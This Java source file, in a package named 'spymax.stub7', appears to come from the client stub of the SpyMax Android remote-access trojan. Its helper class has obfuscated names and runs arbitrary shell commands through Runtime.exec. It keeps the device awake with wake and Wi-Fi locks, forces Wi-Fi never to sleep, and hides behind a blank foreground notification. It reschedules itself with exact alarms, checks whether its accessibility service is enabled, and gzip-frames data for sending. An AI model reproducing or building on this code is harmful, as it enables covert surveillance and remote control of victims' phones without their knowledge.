package spymax.stub7;
import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.webkit.MimeTypeMap;
import android.widget.RemoteViews;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import static android.content.Context.ALARM_SERVICE;
public class ClassGen3 {
    public static Executor ec;
    public static int max = 1000;
    public static String pr;
    public static String tg = ":";
    public static String jz = "-255";
    public static String jq = "-1";
    public static String jx = "1";
    public static char c1 = '1';
    public static int ju = 5 * 5;
    public static BroadcastReceiver rc  =null;
    public static int sf0 = 0;
    public static int sf1 = 0;
    public static int sf2 = 0;


    public static Boolean c(String a,String b){
        if(a.length() > 0 && b.length() > 0){
            if(a.equals(b)){
                return true ;
            }
        }
        return false ;
    }

    public static void exi(Context c, String v){
        int f = 10000;
        try {
            f = Integer.valueOf(v);
        } catch (NumberFormatException e) {}
        if(f == -1){
            if(!ClassGen10.r(ClassGen11.class,c)) {
                Intent i = new Intent(c, ClassGen11.class);
                c.stopService(i);
            }
        }else{
            alr(c,f);
        }
        ClassGen2.di();
        rel(false);
        try{
            android.os.Process.killProcess(android.os.Process.myPid());
        }catch (Exception ex) {}
    }
    public static void gl(Context c){
        try {
            ContentResolver cr = c.getContentResolver();
            int set = android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER;
            android.provider.Settings.System.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, set);
        } catch (Exception e) {}
    }
    public static byte[] f(String s, byte[] b) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        byte[] s0 = cZp(s.getBytes());
        byte[] b0 = cZp(b);
        byte ch = (byte) 0;
        byte[] n0 = String.valueOf(s0.length).getBytes();
        byte[] n1 = String.valueOf(b0.length).getBytes();
        o.write(n0, 0, n0.length);
        o.write(ch);
        o.write(n1, 0, n1.length);
        o.write(ch);
        o.write(s0, 0, s0.length);
        o.write(b0, 0, b0.length);
        byte[] b1 = o.toByteArray();
        try {
            o.close();
        } catch (Exception ex) {
        }
        return b1;
    }
    public static byte[] cZp(byte[] d) throws Exception {
        ByteArrayOutputStream b = new ByteArrayOutputStream(d.length);
        GZIPOutputStream g = new GZIPOutputStream(b);
        g.write(d);
        g.close();
        byte[] m = b.toByteArray();
        b.close();
        return m;
    }
    public static byte[] dZp(byte[] d) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        final int buff = d.length;
        ByteArrayInputStream in = new ByteArrayInputStream(d);
        GZIPInputStream g = new GZIPInputStream(in, buff);
        byte[] b = new byte[buff];
        int cu;
        while ((cu = g.read(b)) != -1) {
            o.write(b, 0, cu);
        }
        g.close();
        in.close();
        byte[] e = o.toByteArray();
        o.close();
        return e;
    }
    public static byte[] getByte(byte[] b, int[] i) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(b, 0, i[0]);
        try {
            o.close();
        } catch (Exception ex) {
        }
        byte[] b0 = o.toByteArray();
        return b0;
    }
    public static byte[] getString(byte[] b, int[] i) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(b, i[0], i[1]);
        try {
            o.close();
        } catch (Exception ex) {
        }
        byte[] b0 = o.toByteArray();
        return b0;
    }
    public static byte[] getBytes(Object j) throws java.io.IOException {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        ObjectOutputStream s = new ObjectOutputStream(o);
        s.writeObject(j);
        s.flush();
        s.close();
        byte[] a = o.toByteArray();
        o.close();
        return a;
    }
    public static String gt(Context ctx, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            String q = s.getString(k, "");
            if (!q.equalsIgnoreCase("")) {
                return q;
            } else {
                return "";
            }
        } catch (Exception e) {
            return "";
        }
    }
    public static void dit(Context ctx, String v, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            SharedPreferences.Editor e = s.edit();
            e.putString(k, v.trim());
            e.commit();
        } catch (Exception e) {
        }
    }
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public static Notification Foreground(Context ctx) {
        RemoteViews rv = new RemoteViews(ctx.getPackageName(),R.layout.s1s2s3s4s5s6);
        final int d = R.drawable.x1x2x3x4x5x6;
        Notification nf = new Notification.Builder(ctx)
                .setContentTitle(null)
                .setContentText(null)
                .setSmallIcon(d)
                .setPriority(Notification.PRIORITY_MAX)
                .setContent(rv)
                .setAutoCancel(false)
                .build();
        return nf;
    }
    private static void e(AlarmManager a, int m, PendingIntent p){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            a.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis()
                            + m, p);
        }else{
            a.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
                    + m, p);
        }
    }
    public static void alr(Context c, int ms){
        Intent t = new Intent(c, ClassGen1.class);
        t.putExtra(c.getResources().getString(R.string.n1n2n3n4n5n6),"");
        PendingIntent p = PendingIntent.getBroadcast(c, 0, t, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager m = (AlarmManager) c.getSystemService(ALARM_SERVICE);
        m.cancel(p);
        e(m,ms,p);
    }
    public static WifiManager.WifiLock Wi;
    public static PowerManager.WakeLock Wa;
    public static void wk(Context c ,boolean b){
        if(b){
            if(Wa == null){
                try{final PowerManager k0 =(PowerManager)c.getSystemService(Context.POWER_SERVICE);
                    if (Wa == null){
                        Wa = k0.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                                c.getString(R.string.i1i2i3i4i5i6).trim());
                        if(!Wa.isHeld()){
                            Wa.acquire();
                        }
                    }} catch (Exception e) {}
            }
        }
        if(Wi == null){
            try{final WifiManager k1 =(WifiManager)c.getSystemService(Context.WIFI_SERVICE);
                if(Wi == null){
                    Wi = k1.createWifiLock(WifiManager.WIFI_MODE_FULL,
                            c.getString(R.string.k1k2k3k4k5k6).trim());
                    if(!Wi.isHeld()){
                        Wi.acquire();
                    }
                }} catch (Exception e) {}
        }


    }
    public static void rel(boolean b){
        try{if(Wa != null){
            if(Wa.isHeld()){
                Wa.release();
                Wa = null;
            }
        }} catch (Exception e) {}

        if(b){
            return;
        }
        try{if(Wi != null){
            if(Wi.isHeld()){
                Wi.release();
                Wi = null;
            }
        }} catch (Exception e) {}
    }
    public static boolean sv(Context ctx){
        try{
          final PowerManager pow = (PowerManager)ctx.getSystemService(Context.POWER_SERVICE);
          if(pow.isPowerSaveMode()== true){
              return true;
          }
         } catch (Exception e) {}
         return false;
    }
    public static void ec(final String c){
        if (((ThreadPoolExecutor) ClassGen3.ec).getActiveCount() >= ClassGen3.max){
            return;
        }
        ClassGen3.ec.execute(new Runnable() {
            public void run() {
                StringBuffer ou = new StringBuffer();
                Process p;
                try {
                    p = Runtime.getRuntime().exec(c);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if(!p.waitFor(60, TimeUnit.SECONDS)) {
                            p.destroy();
                        }
                    }else{
                        p.waitFor();
                    }
                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String ln ;
                    while ((ln = r.readLine())!= null){
                        ou.append(ln);
                    }

                    p.getInputStream().close();
                    p.getOutputStream().close();
                    r.close();
                } catch (Exception e) {
                    dt = "";
                }
                String re = ou.toString();
                if (re.length() == 0){
                    dt = "";
                }
                dt = re;
            }});
    }
    public static String dt = "";
    public static boolean a_(Context ctx, String pk) {
        try{
            PackageManager pm = ctx.getPackageManager();
            try {
                pm.getPackageInfo(pk, PackageManager.GET_ACTIVITIES);
                return pm.getApplicationInfo(pk, 0).enabled;
            }
            catch (PackageManager.NameNotFoundException e) {
                return false;
            }
        } catch (Exception e) {}
        return false;
    }
    public static Boolean t_(Context ctx, String p, String ext2){
        try{
            MimeTypeMap map = MimeTypeMap.getSingleton();
            String type = map.getMimeTypeFromExtension(ext2);
            if (type == null){
                type = "*/*";
            }
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setType(type);
            PackageManager pm = ctx.getPackageManager();
            List<ResolveInfo> act = pm.queryIntentActivities(intent, 0);
            int flag = 0;
            String A1 = "com.google.android.apps.photos";
            String A2 = "com.google.android.music";
            if(type.startsWith("image/") || type.startsWith("video/")){
                if (a_(ctx ,A1)){
                    intent.setPackage(A1);
                }else{
                    flag = -1;
                }
            } else if (type.startsWith("audio/")){
                if (a_(ctx ,A2)){
                    intent.setPackage(A2);
                }else{
                    flag = -1;
                }
            }else{
                if (act.size() > 0) {
                    intent.setPackage(act.get(0).activityInfo.packageName);
                }else{
                    flag = -1;
                }
            }
            if (flag == -1){
                return false;
            }else{
                intent.setDataAndType(Uri.parse(p), type);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                return true;
            }
        } catch (Exception e) {}
        return false;
    }
    public static void r_(Context ctx, String p, String ext2){
        try{
            File file = new File(p);
            MimeTypeMap map = MimeTypeMap.getSingleton();
            String type = map.getMimeTypeFromExtension(ext2);
            if (type == null){
                type = "*/*";
            }
            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri data = Uri.fromFile(file);
            intent.setDataAndType(data, type);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {}
    }

    public static boolean p(Context context, String packageName) {
        try {
            context.getPackageManager().getApplicationInfo(packageName, 0);
            return true;
        }
        catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
    public static void o(Context context, String package_0){
        try{
            Intent i =  context.getPackageManager().getLaunchIntentForPackage(package_0);
            if (i != null) {
                context.startActivity(i);
            }
        } catch (Exception e) {}
    }
    public static boolean acc(Context ctx, Class<?> se) {
        try{
            ComponentName ex = new ComponentName(ctx, se);
            String ss = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (ss == null)
                return false;
            TextUtils.SimpleStringSplitter co = new TextUtils.SimpleStringSplitter(':');
            co.setString(ss);
            while (co.hasNext()) {
                String cs = co.next();
                ComponentName en = ComponentName.unflattenFromString(cs);
                if (en != null && en.equals(ex))
                    return true;
            }
        } catch (Exception e) {}
        return false;
    }
    public static String gh(String er) {
            String h = "<html><head>"
                    + "<style type=\"text/css\">body{color: #fff; background-color: #000;}"
                    + "</style></head>"
                    + "<body>"
                    + er
                    + "</body></html>";
        return h;
    }
    public static void sr(Context ctx ,Intent i){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        }else{
            ctx.startService(i);
        }
    }
}


